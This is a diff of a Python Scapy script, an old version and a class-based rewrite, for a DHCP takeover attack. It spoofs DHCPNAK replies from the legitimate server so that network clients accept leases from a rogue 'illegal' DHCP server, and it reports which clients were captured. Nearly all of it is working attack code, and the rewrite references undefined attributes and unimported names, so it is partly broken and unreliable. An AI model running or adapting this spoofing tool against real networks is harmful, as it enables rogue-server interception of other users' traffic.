@@ -1,140 +1,112 @@
-#!/usr/bin/env python
-#
-# Author: Arn Vollebregt
-# Email: firstname.lastname@xs4all.nl 
-# Version: 0.5.2
-# Date: 12-06-2006 
-# URL: http://82.92.8.139/projects/scapy/
-# Requires: Scapy ( http://www.secdev.org/projects/scapy/ )
-#
-# Goal:
-# Denying x DHCP requests from DHCP clients, in the hope that the DHCP client will choose our 
-# illegal DHCP server over the legit DHCP server. 
-#
-# What does it do: 
-# * Sends a DHCPDISCOVER packet to discover the legit DHCP server.
-# * Detects DHCPREQUEST (broadcast) packets from DHCP clients, and spoofs DHCPNAK packets from the
-#   legit DHCP server. 
-# * Limited to x DHCPNAK packets per DHCP client per negotiation, to avoid total disfunction of 
-#   DHCP clients. x configurable via 'limit' variable (defaults to 3).
-# * Reports if a DHCP client aquired a lease from the legit or illegal DHCP server.
-# * Only retains client information during lease negotiations. New negotiation means new attempt. 
-#
-# What it does not do (yet):
-# * Does not handle multiple (legit) DHCP servers yet. 
-# * Does not use ARP yet to aquire the illegal DHCP's MAC address (cant figure out why that doesnt
-#   want to work for now).
-#
-# TODO:
-# * Find out how to sendp and sniff concurrently.
-# * Solve my ARP discovery problem.
+#!/usr/bin/python
 
-# Number of DHCPNAK packets to spoof before giving up.
-limit = 3
+__author__ = "David Stainton"
+
+# author David Stainton
+# email dstainton415@gmail.com
+# inspired by http://trac.secdev.org/scapy/wiki/DhcpTakeover
 
 import sys
-import string
- 
-if len(sys.argv) is 1:
-    print("Usage: " + sys.argv[0] + " -ip=<illegal DHCP server IP> -mac=<illegal DHCP server mac>"+
-    " -v=<0|1|2>")
-    print("Example: " + sys.argv[0] + " -ip=192.168.0.2 -mac=00:00:00:00:00:00 -v=1")
-    print("-ip : Your own DHCP server, so that we know not to spoof DHCPNAK's from it.")
-    print("-mac: The MAC address of your DHCP server. (See source for reason)")
-    print("-v  : Verbosity level; 0: Silent 1: Detected DHCP leases 2: Detected DHCPREQUEST's+"+
-    "spoofed DHCPNAK's")
-    print("-ip and -mac are manditory, -v is optional (defaults to 2)")
-    sys.exit(0)
+from optparse import OptionParser
 
-globals()['verbose'] = 2
+import scapy
+import scapy.all
+from scapy.all import DHCP, ARP, BOOTP, Ether, IP
 
-for i in range(len(sys.argv)):
-    if string.find(sys.argv[i], "-ip") is 0:
-        globals()['illegal_dhcp_server_ip'] = sys.argv[i].split('=')[1]
-    elif string.find(sys.argv[i], "-mac") is 0:
-        globals()['illegal_dhcp_server_mac'] = sys.argv[i].split('=')[1]
-    elif string.find(sys.argv[i], "-v") is 0:
-        globals()['verbose'] = int(sys.argv[i].split('=')[1])
 
-if vars().has_key('illegal_dhcp_server_ip') is False:
-    print("Please provide the -ip switch")
-    sys.exit(0)
-if vars().has_key('illegal_dhcp_server_mac') is False:
-    print("Please provide the -mac switch")
-    sys.exit(0)
+class DHCP_takeover:
 
-from scapy import conf,sendp,srp1,sniff,Ether,IP,ARP,UDP,BOOTP,DHCP
-conf.verb=0
+    def __init__(self, mac=None, ip=None):
 
-# TODO: Find out why this works in a standalone script, but not here. Might be my slow laptop...
-# Aquiring the MAC address of the illegal DHCP server.
-#packet=srp1(Ether()/ARP(pdst=illegal_dhcp_server_ip))
-#illegal_dhcp_server_mac = packet.hwsrc 
+        self.our_dhcp_server_mac = mac
+        self.our_dhcp_server_ip  = ip 
+        self.nak_limit           = 3
+        self.macs                = {}
+        self.attempted_dhcpnaks  = {}
+        self.other_dhcp_servers = {}
 
-# This array will hold the MAC from a DHCP client, and the number of times we have tried to spoof 
-# a DHCPNAK from the legit DHCP server.
-attempted_dhcpnaks = {}
 
-# This array holds the MAC address from DHCP clients which have send a DHCPREQUEST. We use it to
-# cross reference it with ARP packets to see from which DHCP server a lease was obtained.
-macs = {}
+    # populate self.other_dhcp_servers; key as mac addr and value as ip addr
+    # skip over entrees from our own dhcp server self.our_dhcp_server_mac
+    def get_dhcp_servers(self):
 
-def msg(string, level):
-    if globals()['verbose'] >= level:
-        print(string)
+        scapy.all.conf.checkIPaddr = False
+        fam,hw = scapy.all.get_if_raw_hwaddr(scapy.all.conf.iface)
 
-# Sending a DHCPDISCOVER to aquire the DHCP server IP.
-msg("Sending DHCPDISCOVER packet to discover DHCP servers",2)
-sendp(Ether(src="00:00:00:00:00:00",dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")
-/UDP(sport=68,dport=67)/BOOTP(chaddr="\x00\x00\x00\x00\x00\x00",xid=0x10000000)/
-DHCP(options=[('message-type','discover'),('end')]))
+        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / \
+            IP(src="0.0.0.0",dst="255.255.255.255") / \
+            scapy.all.UDP(sport=68,dport=67) / \
+            scapy.all.BOOTP(chaddr=hw) / \
+            scapy.all.DHCP(options=[("message-type","discover"),"end"])
 
-# Filtering out the DHCP server it's IP address, and storing it in a global variable. We ignore our 
-# own DHCP server via a bpf filter in the sniff command below. 
-def get_dhcp_server(pkt):
-    if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
-        globals()["dhcp_server_ip"] = pkt[IP].src
-        globals()["dhcp_server_mac"] = pkt[Ether].src
-        msg("Legit DHCP server found on " + globals()['dhcp_server_ip'],1)
+        ans,unans = scapy.all.srp(dhcp_discover)
+        dhcp_servers = []
+        for snd,rcv in ans:
+            if rcv[Ether].src != self.our_dhcp_server_mac:
+                self.other_dhcp_servers[rcv[Ether].src] = rcv[IP].src
 
-# Detecting DHCPREQUEST packets and ARP packets.
-def detect_dhcp_request(pkt):
-    if pkt[DHCP] and pkt[DHCP].options[0][1] == 3:
-        msg("DHCPREQUEST detected from " + pkt[Ether].src,2)
-        globals()['macs'][pkt[Ether].src] = pkt[Ether].src 
-        if globals()['attempted_dhcpnaks'].has_key(pkt[Ether].src) == False:
-            globals()['attempted_dhcpnaks'][pkt[Ether].src] = 0
-        if globals()['attempted_dhcpnaks'][pkt[Ether].src] < globals()['limit']:
-            globals()['attempted_dhcpnaks'][pkt[Ether].src] += 1
-            nak_request(pkt)
-        else:
-            msg("Giving up on spoofing DHCPNAK's for " + pkt[Ether].src + ", failed " +
-            str(globals()['limit']) + " times",2)
-            del globals()['attempted_dhcpnaks'][pkt[Ether].src]
-    if pkt[ARP] and pkt[ARP].op == 0x0002:
-        if globals()['macs'].has_key(pkt[Ether].src) == True:
-            if pkt[ARP].hwdst == globals()['illegal_dhcp_server_mac']:
-                msg("Succes: DHCP client " + pkt[ARP].hwsrc + " obtained a lease for " +
-                pkt[ARP].psrc + "from the illegal DHCP server",1) 
-            elif pkt[ARP].hwdst == globals()['dhcp_server_mac']:
-                msg("Failure: DHCP client " + pkt[ARP].hwsrc + " obtained a lease for " +
-                pkt[ARP].psrc + " from the legit DHCP server",1) 
-            del globals()['macs'][pkt[Ether].src]
 
-# Spoofing a DHCPNAK from the legit DHCP server when a DHCPREQUEST is send from the DHCP client.
-def nak_request(pkt):
-    msg("Spoofing DHCPNAK from " + globals()['dhcp_server_mac'],2)
-    sendp(Ether(src=globals()['dhcp_server_mac'], dst=pkt[Ether].dst)/
-    IP(src=globals()['dhcp_server_ip'],dst=pkt[IP].dst)/UDP(sport=67,dport=68)/
-    BOOTP(op=2, ciaddr=pkt[IP].src,siaddr=pkt[IP].dst,chaddr=pkt[Ether].src, xid=pkt[BOOTP].xid)/
-    DHCP(options=[('server_id',globals()['dhcp_server_ip']),('message-type','nak'), ('end')]))
+    # Spoofing a DHCPNAK from a legit DHCP server when a DHCPREQUEST is send from the DHCP client.
+    def nak_request(self, packet):
 
-sniff(filter="udp and not host " + globals()['illegal_dhcp_server_ip'] + " and (port 67 or 68)",
-prn=get_dhcp_server, store=0, count=1, timeout=1)
+        print "Spoofing DHCPNAK from %s / %s" % (self.my_dhcp_server_mac, self.my_dhcp_server_ip)
 
-if globals().has_key('dhcp_server_ip') == False:
-    print("No other DHCP server found, exiting")
-    sys.exit(0)
+        nak = Ether(src=self.my_dhcp_server_mac, dst=packet[Ether].dst) / \
+            IP(src=self.my_dhcp_server_ip, dst=packet[IP].dst) / \
+            UDP(sport=67,dport=68) / \
+            BOOTP(op=2, ciaddr=packet[IP].src, siaddr=packet[IP].dst, chaddr=packet[Ether].src, xid=packet[BOOTP].xid) / \
+            DHCP(options=[('server_id', self.my_dhcp_server_ip),('message-type','nak'), ('end')])
 
-sniff(filter="arp or (udp and (port 67 or 68))", prn=detect_dhcp_request, store=0)
+        sendp(nak)
+
+
+    # Detecting DHCPREQUEST packets and ARP packets.
+    def check_dhcp_and_arp(self, packet):
+
+        if packet[DHCP] and packet[DHCP].options[0][1] == 3:
+            print "DHCPREQUEST detected from %s" %  packet[Ether].src
+            self.macs[packet[Ether].src] = 0
+
+            if self.attempted_dhcpnaks.has_key(packet[Ether].src) == False:
+                self.attempted_dhcpnaks[packet[Ether].src] = 0
+
+            if self.attempted_dhcpnaks[packet[Ether].src] < self.nak_limit:
+                attempted_dhcpnaks[packet[Ether].src] += 1
+                self.nak_request(packet)
+            else:
+                print "Giving up on spoofing DHCPNAK's for %s, failed" % packet[Ether].src
+                del self.attempted_dhcpnaks[packet[Ether].src]
+
+        if packet[ARP] and packet[ARP].op == 0x0002:
+            if self.macs.has_key(packet[Ether].src) == True:
+                if packet[ARP].hwdst == self.our_dhcp_server_mac:
+                    print "Succes: DHCP client %s obtained a lease for %s from our DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc)
+                elif packet[ARP].hwdst in self.other_dhcp_servers:
+                    print "Failure: DHCP client %s obtained a lease for %s from another DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc, )
+                del self.macs[packet[Ether].src]
+
+
+    def takeover(self):
+        scapy.all.sniff(filter="arp or (udp and (port 67 or 68))", prn=self.check_dhcp_and_arp, store=0)
+
+
+def main():
+
+    usage = '%prog [options] <our-mac-addr> <our-ip-addr>'
+    parser = OptionParser(usage=usage)
+    options, args = parser.parse_args()
+
+    if len(args) < 2:
+            parser.print_help()
+            return 1
+
+    d = DHCP_takeover(mac=args[0], ip=args[1])
+    d.get_dhcp_servers()
+    d.takeover()    
+
+
+
+if __name__ == '__main__':
+    sys.exit(main())
+
 
